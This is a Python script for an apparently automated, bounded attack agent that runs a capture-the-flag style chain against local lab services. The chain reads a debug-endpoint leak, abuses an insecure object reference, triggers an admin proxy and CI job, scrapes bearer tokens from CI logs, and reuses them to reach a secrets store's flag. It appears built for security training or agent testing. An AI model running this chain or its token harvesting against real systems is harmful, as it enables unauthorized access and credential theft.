#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import os
import re
import sys
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urljoin, urlparse
from urllib.request import Request, urlopen


FLAG_RE = re.compile(r"FLAG\{[^}]+\}")
TOKEN_RE = re.compile(r"(?:token=|Bearer\s+)([A-Za-z0-9._:-]{6,})")


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def parse_scalar(value: str) -> Any:
    value = value.strip()
    if value.isdigit():
        return int(value)
    if value.lower() in {"true", "false"}:
        return value.lower() == "true"
    return value


def parse_simple_yaml(path: Path) -> dict[str, Any]:
    """Parse the small YAML subset used by scope.yml without external deps."""
    data: dict[str, Any] = {}
    current_key: str | None = None

    for raw_line in path.read_text(encoding="utf-8").splitlines():
        line = raw_line.split("#", 1)[0].rstrip()
        if not line.strip():
            continue

        stripped = line.strip()
        if stripped.startswith("- "):
            if current_key is None:
                raise ValueError(f"List item without key in {path}: {raw_line}")
            data.setdefault(current_key, []).append(parse_scalar(stripped[2:]))
            continue

        if ":" not in stripped:
            raise ValueError(f"Unsupported scope line in {path}: {raw_line}")

        key, value = stripped.split(":", 1)
        key = key.strip()
        value = value.strip()
        current_key = key

        if value:
            data[key] = parse_scalar(value)
        else:
            data[key] = []

    return data


def append_jsonl(path: Path, event: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(event, sort_keys=True) + "\n")


def load_json(path: Path, default: dict[str, Any]) -> dict[str, Any]:
    if not path.exists():
        return default
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        return default


def truncate(value: str, limit: int = 2000) -> str:
    if len(value) <= limit:
        return value
    return value[:limit] + "...<truncated>"


def nested_flags(value: Any) -> list[str]:
    text = json.dumps(value, sort_keys=True) if not isinstance(value, str) else value
    return sorted(set(FLAG_RE.findall(text)))


def extract_tokens(value: Any) -> list[str]:
    text = json.dumps(value, sort_keys=True) if not isinstance(value, str) else value
    return sorted(set(TOKEN_RE.findall(text)))


@dataclass
class ResponseRecord:
    status: int
    url: str
    body: str
    json_body: Any | None
    error: str | None = None


class RalphLoop:
    def __init__(self, workspace: Path, artifacts: Path) -> None:
        self.workspace = workspace
        self.artifacts = artifacts
        self.memory_dir = artifacts / "memory"
        self.logs_dir = artifacts / "logs"
        self.state_path = self.memory_dir / "state.json"
        self.scope = parse_simple_yaml(workspace / "scope.yml")
        self.allowed_hosts = set(self.scope.get("allowed_hosts", []))
        self.max_iterations = int(self.scope.get("max_iterations", 12))
        self.max_requests = int(self.scope.get("max_requests_per_iteration", 8))
        self.timeout = int(self.scope.get("timeout_seconds", 3))
        self.request_count = 0
        self.targets = {
            "web": os.getenv("TARGET_WEB", "http://web-portal:8080"),
            "admin": os.getenv("TARGET_ADMIN", "http://internal-admin:8081"),
            "ci": os.getenv("TARGET_CI", "http://ci-runner:8082"),
            "secret": os.getenv("TARGET_SECRET", "http://secrets-store:8083"),
        }
        self.state = load_json(self.state_path, self.default_state())
        self.memory_dir.mkdir(parents=True, exist_ok=True)
        self.logs_dir.mkdir(parents=True, exist_ok=True)

    def default_state(self) -> dict[str, Any]:
        return {
            "created_at": utc_now(),
            "updated_at": utc_now(),
            "goal": self.scope.get("goal", "Find the training flag."),
            "iterations": 0,
            "completed_probes": [],
            "known": {
                "debug": {},
                "profiles": {},
                "tokens": [],
                "flag": None,
            },
            "findings": [],
            "failures": [],
        }

    def save_state(self) -> None:
        self.state["updated_at"] = utc_now()
        self.state_path.write_text(json.dumps(self.state, indent=2, sort_keys=True), encoding="utf-8")

    def validate_url(self, url: str) -> None:
        parsed = urlparse(url)
        if parsed.scheme not in {"http", "https"}:
            raise ValueError(f"Denied URL scheme: {parsed.scheme}")
        if parsed.netloc not in self.allowed_hosts:
            raise ValueError(f"Denied host outside scope: {parsed.netloc}")

    def build_url(self, base: str, path: str, query: dict[str, str] | None = None) -> str:
        url = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
        if query:
            url += "?" + urlencode(query)
        self.validate_url(url)
        return url

    def request(
        self,
        method: str,
        base: str,
        path: str,
        query: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
        body: dict[str, Any] | None = None,
    ) -> ResponseRecord:
        if self.request_count >= self.max_requests:
            raise RuntimeError("Per-iteration request budget exhausted")

        url = self.build_url(base, path, query)
        self.request_count += 1
        data = json.dumps(body).encode("utf-8") if body is not None else None
        request_headers = dict(headers or {})
        if body is not None:
            request_headers["Content-Type"] = "application/json"

        append_jsonl(
            self.logs_dir / "requests.jsonl",
            {
                "ts": utc_now(),
                "method": method,
                "url": url,
                "headers": sorted(request_headers),
                "has_body": body is not None,
            },
        )

        request = Request(url, data=data, headers=request_headers, method=method)
        try:
            with urlopen(request, timeout=self.timeout) as response:
                raw_body = response.read().decode("utf-8", errors="replace")
                status = response.status
                error = None
        except HTTPError as exc:
            raw_body = exc.read().decode("utf-8", errors="replace")
            status = exc.code
            error = f"HTTPError: {exc.code}"
        except URLError as exc:
            raw_body = ""
            status = 0
            error = f"URLError: {exc.reason}"

        json_body: Any | None
        try:
            json_body = json.loads(raw_body) if raw_body else None
        except json.JSONDecodeError:
            json_body = None

        append_jsonl(
            self.logs_dir / "responses.jsonl",
            {
                "ts": utc_now(),
                "status": status,
                "url": url,
                "error": error,
                "body": truncate(raw_body),
            },
        )
        return ResponseRecord(status=status, url=url, body=raw_body, json_body=json_body, error=error)

    def complete_probe(self, name: str) -> None:
        completed = self.state.setdefault("completed_probes", [])
        if name not in completed:
            completed.append(name)

    def add_finding(self, name: str, severity: str, evidence: dict[str, Any]) -> None:
        if any(item["name"] == name for item in self.state.get("findings", [])):
            return
        event = {
            "ts": utc_now(),
            "name": name,
            "severity": severity,
            "evidence": evidence,
        }
        self.state.setdefault("findings", []).append(event)
        append_jsonl(self.memory_dir / "findings.jsonl", event)

    def add_failure(self, name: str, reason: str, evidence: dict[str, Any] | None = None) -> None:
        event = {
            "ts": utc_now(),
            "name": name,
            "reason": reason,
            "evidence": evidence or {},
        }
        self.state.setdefault("failures", []).append(event)
        append_jsonl(self.memory_dir / "failures.jsonl", event)

    def remember_tokens(self, tokens: list[str]) -> None:
        known = self.state["known"]
        merged = sorted(set(known.get("tokens", []) + tokens))
        known["tokens"] = merged

    def remember_flag(self, flags: list[str], source: str) -> None:
        if not flags:
            return
        flag = flags[0]
        self.state["known"]["flag"] = flag
        self.add_finding(
            "training_flag_confirmed",
            "critical",
            {"source": source, "flag": flag},
        )

    def choose_hypotheses(self) -> list[str]:
        completed = set(self.state.get("completed_probes", []))
        known = self.state.get("known", {})

        if known.get("flag"):
            return []
        if "debug_leak" not in completed:
            return ["debug_leak"]
        if "idor_profiles" not in completed:
            return ["idor_profiles"]
        if "admin_proxy_ci_trigger" not in completed:
            return ["admin_proxy_ci_trigger"]
        if "ci_log_token_leak" not in completed:
            return ["ci_log_token_leak"]
        if known.get("tokens") and "secret_store_token_reuse" not in completed:
            return ["secret_store_token_reuse"]
        return []

    def probe_debug_leak(self) -> None:
        response = self.request("GET", self.targets["web"], "/api/error-debug")
        if response.status != 200 or not isinstance(response.json_body, dict):
            self.add_failure("debug_leak", "debug endpoint did not return expected JSON", {"status": response.status})
            self.complete_probe("debug_leak")
            return

        body = response.json_body
        self.state["known"]["debug"] = {
            "internal_admin_url": body.get("internal_admin_url"),
            "example_internal_header": body.get("example_internal_header"),
        }
        if body.get("traceback") or body.get("internal_admin_url"):
            self.add_finding(
                "debug_information_disclosure",
                "medium",
                {
                    "url": response.url,
                    "leaked_keys": sorted(k for k in body if k in {"traceback", "internal_admin_url", "example_internal_header"}),
                },
            )
        else:
            self.add_failure("debug_leak", "no useful debug leakage observed", {"url": response.url})
        self.complete_probe("debug_leak")

    def probe_idor_profiles(self) -> None:
        profiles: dict[str, Any] = {}
        for profile_id in ("1", "3"):
            response = self.request("GET", self.targets["web"], "/api/profile", query={"id": profile_id})
            if response.status == 200 and isinstance(response.json_body, dict):
                profiles[profile_id] = response.json_body
            else:
                self.add_failure(
                    "idor_profiles",
                    "profile request failed",
                    {"profile_id": profile_id, "status": response.status},
                )

        self.state["known"]["profiles"] = profiles
        admin_profile = profiles.get("3", {})
        if admin_profile.get("role") == "admin":
            self.add_finding(
                "object_authorization_gap",
                "medium",
                {"endpoint": "/api/profile", "profile_id": "3", "observed_role": "admin"},
            )
        else:
            self.add_failure("idor_profiles", "admin profile was not readable", {"profiles": profiles})
        self.complete_probe("idor_profiles")

    def probe_admin_proxy_ci_trigger(self) -> None:
        response = self.request("GET", self.targets["web"], "/api/admin/proxy-run", query={"job": "export"})
        flags = nested_flags(response.json_body if response.json_body is not None else response.body)
        if response.status == 200:
            self.add_finding(
                "trusted_header_admin_pivot",
                "high",
                {"endpoint": "/api/admin/proxy-run", "status": response.status},
            )
            self.add_finding(
                "overprivileged_ci_job_path",
                "high",
                {"job": "export", "status": response.status},
            )
            self.remember_flag(flags, "admin_proxy_ci_trigger")
        else:
            self.add_failure("admin_proxy_ci_trigger", "proxy-triggered job failed", {"status": response.status})
        self.complete_probe("admin_proxy_ci_trigger")

    def probe_ci_log_token_leak(self) -> None:
        response = self.request("GET", self.targets["ci"], "/logs")
        tokens = extract_tokens(response.json_body if response.json_body is not None else response.body)
        if response.status == 200 and tokens:
            self.remember_tokens(tokens)
            self.add_finding(
                "secret_token_in_ci_logs",
                "high",
                {"endpoint": "/logs", "token_count": len(tokens)},
            )
        else:
            self.add_failure("ci_log_token_leak", "no token observed in CI logs", {"status": response.status})
        self.complete_probe("ci_log_token_leak")

    def probe_secret_store_token_reuse(self) -> None:
        tokens = self.state["known"].get("tokens", [])
        if not tokens:
            self.add_failure("secret_store_token_reuse", "no tokens available")
            self.complete_probe("secret_store_token_reuse")
            return

        for token in tokens[:3]:
            response = self.request(
                "GET",
                self.targets["secret"],
                "/secret",
                headers={"Authorization": f"Bearer {token}"},
            )
            flags = nested_flags(response.json_body if response.json_body is not None else response.body)
            if response.status == 200 and flags:
                self.add_finding(
                    "token_reuse_to_secret_store",
                    "critical",
                    {"endpoint": "/secret", "status": response.status},
                )
                self.remember_flag(flags, "secret_store_token_reuse")
                break
            self.add_failure(
                "secret_store_token_reuse",
                "token did not unlock secret store",
                {"status": response.status},
            )
        self.complete_probe("secret_store_token_reuse")

    def write_lessons(self) -> None:
        known = self.state.get("known", {})
        findings = self.state.get("findings", [])
        failures = self.state.get("failures", [])
        lines = [
            "# RALPH Lessons",
            "",
            f"- Updated: {utc_now()}",
            f"- Iterations: {self.state.get('iterations', 0)}",
            f"- Findings: {len(findings)}",
            f"- Failures: {len(failures)}",
            f"- Flag: {known.get('flag') or 'not found'}",
            "",
            "Confirmed findings:",
        ]
        if findings:
            lines.extend(f"- {item['name']} ({item['severity']})" for item in findings)
        else:
            lines.append("- none")

        lines.extend(["", "Useful memory:", ""])
        lines.append(f"- Tokens known: {len(known.get('tokens', []))}")
        lines.append(f"- Profiles observed: {sorted(known.get('profiles', {}).keys())}")
        self.memory_dir.joinpath("lessons.md").write_text("\n".join(lines) + "\n", encoding="utf-8")

    def run(self) -> int:
        for iteration in range(1, self.max_iterations + 1):
            self.request_count = 0
            hypotheses = self.choose_hypotheses()
            self.state["iterations"] = iteration

            append_jsonl(
                self.memory_dir / "hypotheses.jsonl",
                {"ts": utc_now(), "iteration": iteration, "hypotheses": hypotheses},
            )

            if not hypotheses:
                append_jsonl(
                    self.logs_dir / "iterations.jsonl",
                    {"ts": utc_now(), "iteration": iteration, "status": "no_hypotheses"},
                )
                break

            for hypothesis in hypotheses:
                method_name = f"probe_{hypothesis}"
                probe = getattr(self, method_name)
                probe()
                if self.state["known"].get("flag"):
                    break

            append_jsonl(
                self.logs_dir / "iterations.jsonl",
                {
                    "ts": utc_now(),
                    "iteration": iteration,
                    "hypotheses": hypotheses,
                    "requests": self.request_count,
                    "flag_found": bool(self.state["known"].get("flag")),
                },
            )
            self.save_state()

            if self.state["known"].get("flag"):
                break

        self.write_lessons()
        self.save_state()

        flag = self.state["known"].get("flag")
        if flag:
            print(f"RALPH goal reached: {flag}")
            return 0
        print("RALPH stopped without finding the flag. See /artifacts/memory/failures.jsonl.")
        return 1


def main() -> int:
    parser = argparse.ArgumentParser(description="Bounded RALPH loop for the local training lab.")
    parser.add_argument("--workspace", default="/workspace", help="Directory containing scope.yml and task files.")
    parser.add_argument("--artifacts", default="/artifacts", help="Writable directory for memory and logs.")
    args = parser.parse_args()

    try:
        agent = RalphLoop(Path(args.workspace), Path(args.artifacts))
        return agent.run()
    except Exception as exc:  # Keep failures visible in container logs.
        print(f"RALPH fatal error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
